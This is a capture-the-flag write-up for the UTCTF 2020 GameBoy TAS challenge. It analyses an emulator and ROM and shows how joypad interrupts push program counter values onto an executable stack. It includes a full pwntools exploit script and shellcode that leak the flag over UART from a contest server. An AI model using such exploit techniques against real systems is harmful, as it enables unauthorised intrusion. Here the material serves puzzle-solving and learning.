@@ -1,0 +1,284 @@
+#+title: UTCTF 2020 - GameBoy TAS (pwn/reversing)
+#+author: Daniel Brodsky
+#+date: 2020-03-10
+#+hugo_base_dir: ../../
+#+hugo_section: writeups
+#+startup: inlineimages
+#+startup: inlineimages
+#+hugo_menu: :menu "foo" :weight 10 :parent main :identifier single-toml
+#+description: 16-bit gaming
+
+** Problem
+~Here's a GameBoy ROM, can you dump the flag at the beginning of memory?~
+** Analysis
+The [[/w4_program.gb][program]] is hosted on a remote server where we can only interface with it
+through a GameBoy emulator (both are provided for local exploitation). The only
+inputs you can give to the emulator is a joypad input and a duration of clock
+cycles to run after pressing the button. This is a modified version of the
+emulator located [[https://github.com/429ers/OOPBoy][here]], where the main method for GameBoy.java has been changed
+to:
+#+BEGIN_SRC JAVA
+    public void main() throws Exception {
+        Scanner fin = new Scanner(System.in);
+        File file = new File("./utctf.gb");
+        new FileInputStream(file).read(this.mmu.mem);
+        this.cpu.regs.AF.write(432);
+        this.cpu.regs.BC.write(19);
+        this.cpu.regs.DE.write(216);
+        this.cpu.regs.HL.write(333);
+        this.cpu.regs.SP.write(65534);
+        this.cpu.regs.PC.write(256);
+        int currentKey = 48;
+        System.out.println("Welcome to the UTCTF Game Boy TAS! ");
+        for (int i = 0; i < 12; ++i) {
+            int nextKey;
+            System.out.print("Please enter your next command: ");
+            String key = fin.next();
+            int duration = fin.nextInt();
+            if (duration > 40000) {
+                System.out.println("Duration cannot exceed 40000");
+                System.exit(0);
+            }
+            if ((nextKey = this.getKeyEvent(key.charAt(0))) != currentKey) {
+                this.joypad.keyReleased(currentKey);
+                this.joypad.keyPressed(nextKey);
+                currentKey = nextKey;
+            }
+            this.time = 0L;
+            while (this.time < (long)duration) {
+                this.cpu.executeOneInstruction(false, false);
+            }
+        }
+        System.out.println("You ran out of commands");
+    }
+
+    public static void main(String[] args) throws Exception {
+        instance.main();
+    }
+}
+#+END_SRC
+This was obtained by decompiling the provided ~.jar~ file using CFR.
+
+From here we can see that we are able to give up to 12 joypad inputs and the max
+duration to run after these inputs is 40000 clock cycles.
+
+Looking at the ROM file provided, the program is 32KB in size, but using ~xxd~
+we see that there isn't actually all that much going on:
+#+BEGIN_SRC shell
+~: xxd utctf.gb
+ 00000010: 181e 7574 666c 6167 7b52 4544 4143 5445  ..utflag{REDACTE
+ 00000020: 445f 5245 4441 4354 4544 5f2e 2e2e 2e7d  D_REDACTED_....}
+ 00000030: 3ec3 e0fc 3e50 e0fd 3e01 e0fe 3cc3 0001  >...>P..>...<...
+ 00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 00000060: 0cfb c300 0100 0000 0000 0000 0000 0000  ................
+ 00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ 00000100: 00c3 5001 ceed 6666 cc0d 000b 0373 0083  ..P...ff.....s..
+ 00000110: 000c 000d 0008 111f 8889 000e dccc 6ee6  ..............n.
+ 00000120: dddd d999 bbbb 6763 6e0e eccc dddc 999f  ......gcn.......
+ 00000130: bbb9 333e 5554 4354 4652 4f4d 0000 0000  ..3>UTCTFROM....
+ 00000140: 0000 0000 0000 0000 0000 0001 010a 16bf  ................
+ 00000150: fe01 2001 c700 0000 0000 0000 0000 0000  .. .............
+ 00000160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ ... (\x00 here)
+ 00001ff0: 0000 0000 0000 0000 0000 0000 00c3 80ff  ................
+ ... (\x00 here)
+ 00007ff0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+#+END_SRC
+
+Most of the file consists of ~\x00~, which is the opcode for ~NOP~ in Sharp
+LR35902 processor (the processor used in GameBoys).
+
+Fun fact: The processor used in GameBoys is heavily based off the [[https://en.wikipedia.org/wiki/Zilog_Z80][Z80 processor]],
+which is one of the most popular processors of all time.
+
+In order to understand what this ROM is doing, we need a disassembler that can
+convert the opcode instruction to its corresponding assembly. I was hoping to do
+this myself using Ghidra and its processor specification language [[https://ghidra.re/courses/languages/html/sleigh.html][SLEIGH]], but
+someone had already beat me to it (their extension [[https://github.com/Gekkio/GhidraBoy][here]]). Darn! :(
+
+Dropping the ROM file into Ghidra with the GhidraBoy extension loaded, we get
+the following disassembled code:
+
+[[/w4_entry.png]]
+
+This will either run the init routine or begin executing a nopslide that goes
+all the way to the end of memory.
+
+The init routine is fairly simple:
+
+[[/w4_init.png]]
+
+It just sets all registers to 0, sets the stack pointer SP, enables interrupts
+with the EI instruction, and increments register A so that we don't run the
+routine again.
+
+There's also an entry for joypad interrupts:
+
+[[/w4_joypad.png]]
+
+which will run each time a joypad interrupt is triggered by the emulator.
+
+** Vulnerability
+The core "vulnerability" in this problem lies in the architecture for the Sharp
+SM83. When an interrupt is triggered, the current instruction pointer will be
+pushed onto the stack.
+
+#+BEGIN_SRC JAVA
+// Run on each interrupt received
+  void serviceInterrupts() {
+    if (this.interrupted) {
+      this.interrupted = false;
+      this.halted = false;
+      int interruptVector = this.pendingInterrupt;
+      if (interruptVector != -1) {
+        this.clockCycleDelta += 12;
+        this.PUSH(this.regs.PC); // Push current program counter to the stack
+        this.regs.PC.write(interruptVector); // move execution to interrupt address
+        this.interruptHandler.setInterruptsEnabled(false);
+      }
+    }
+  }
+#+END_SRC
+
+Sharp SM83 has no stack execution protection, so if the program executes the end
+of memory where the stack is located (base is at 0xFFFC) then we can run the PC
+values we pushed onto the stack as shellcode.
+
+There's only one problem with this approach: we're limited to 40000 clock cycles
+per input, and most instructions take at least 4 clock cycles. That means at
+most we can reach ~10000 = 0x2710~. There's 2 ways to bypass this limit:
+- run the same joypad input again, which does not trigger an interrupt and will
+  continue from the last executed address
+- do nothing and let the instruction at 0x1ffd skip us to the stack:
+#+BEGIN_SRC text
+1ffd  c3   80  ff      JP LAB_ff80
+#+END_SRC
+
+The stack base is at 0xFFFC so this jump is very close.
+Nice how the problem creator dumped that one in. :)
+
+** Exploit
+In order to dump out the flag we need two things:
+- a computation for converting the value we want in our shellcode to the number of clock
+  cycles needed to reach that address
+- shellcode for leaking the flag in memory
+
+Each joypad input has a base number of clock cycles for the interrupt routine,
+followed by 4 clock cycles for each NOP we want to execute. The first input also
+has to execute the init routine and has an additional base, but we'll sacrifice
+1 of our writes to not have to bother with this. We can get the base
+clock cycles required by doing ~BASE_CYCLES = step(4*target_address) - actual_address~
+for any target address, which results in a value of 322. So our final function
+will be:
+#+BEGIN_SRC Python
+cycles = (target_addr - 322) * 4
+#+END_SRC
+
+Now we need to write our shellcode. Note that since the init routine takes up
+space in the beginning of memory, we cannot write 2-byte values from 0x0-0x150.
+Also, because of the JP instruction at 0x1ffd, we cannot use 2-byte values from
+0x1ffd-0xffff. After playing around with different SM83 instructions, I came up
+with the following shellcode:
+#+BEGIN_SRC Python
+
+NOP             LD C, d8        # NOP for padding on this line
+FLAG_START      INC D           # Load flag start address into register C (INC D is padding)
+LD A, (BC)      INC D           # use combined register BC as 16-bit address and load value into A
+LDH (a8), A     UART            # Load value in A into 0xff00 + UART (0xff01 is UART address)
+#+END_SRC
+
+Note that writing values to UART (universal asynchronous receiver/transmitter)
+will print the value written to the screen. You can see this in the emulator's
+implementation for memory read/write.
+
+The shellcode above only prints 1 byte at a time, but we can just
+run our exploit until we have the entire flag. Putting everything above
+together, this is the final exploit code:
+
+#+BEGIN_SRC Python
+from pwn import *
+import re
+
+ROUTINE_OFFSET = 322
+UART = 0x01
+LDH_a8_A = 0xE0
+NOP = 0x00
+FLAG_START = 0x12
+LD_C_d8 = 0x0E
+LD_A_aBC = 0x0A
+INC_D = 0x13
+
+# nops cost 4 cycles
+NOP_COST = 4
+
+
+char = "a"
+# 16-bit architecture so we write 2 bytes to the stack each time
+def write_short(byte1, byte2):
+    global char
+    short = int(str(hex(byte1)[2:]) + str(hex(byte2)[2:].rjust(2, "0")), 16)
+    cycles = (short - ROUTINE_OFFSET - 2) * NOP_COST
+    r.recvuntil("Please enter your next command: ")
+    r.sendline(char + " " + str(cycles))
+    char = chr(ord(char) ^ ord("b") ^ ord("a")) # toggle joypad inputs to trigger new interrupts
+
+
+out = ""
+def run_shellcode():
+    global out
+    global char
+    r.clean(0)
+    r.sendline(char + " 32000") # 32000 cycles is enough to execute the entire stack
+    res = r.clean(1).decode("ISO-8859-1")
+    print(res)
+    out += re.search("d: (.)P", res).groups()[0]
+
+
+for _ in range(30):
+    r = process(["/usr/bin/java", "com.garrettgu.oopboystripped.GameBoy"])
+    # r = remote("3.91.17.218", 9002)
+
+    # shellcode is written in reverse order since stack grows upwards (to smaller addresses)
+    # but code is executed downwards (to larger addresses)
+    payload = [
+        UART, LDH_a8_A,
+        INC_D, LD_A_aBC,
+        INC_D, FLAG_START,
+        LD_C_d8, NOP,
+    ]
+    r.sendline("a 256") # write some trash to get init routine offset out of the way
+    r.sendline("b 256")
+
+    for s in range(0, len(payload), 2):
+        write_short(payload[s], payload[s + 1])
+
+    run_shellcode()
+    FLAG_START += 1 # get the next flag character
+    char = "a"
+    r.close()
+#+END_SRC
+
+Running this against the server we get the following flag:
+~utflag{dmg_cool_ciAkDGw5cf}~
+
+** Opinion
+Very fun question! It didn't take a ton of effort to solve, and gave me the
+opportunity to mess with an architecture outside of the standard ones used in
+CTFs (x86_64, ARM, MIPS, etc). The restrictions on usable opcodes seemed like an
+unnecessary way to make the problem harder than it needed to be, but overall it
+was still satisfying.
+
+** References
+- opcode table from https://www.pastraiser.com
+- The emulator in the problem https://github.com/429ers/OOPBoy, which was
+  written by the problem creators
+- Wikipedia page for the Z80 processor https://en.wikipedia.org/wiki/Zilog_Z80#Z80_assembly_language
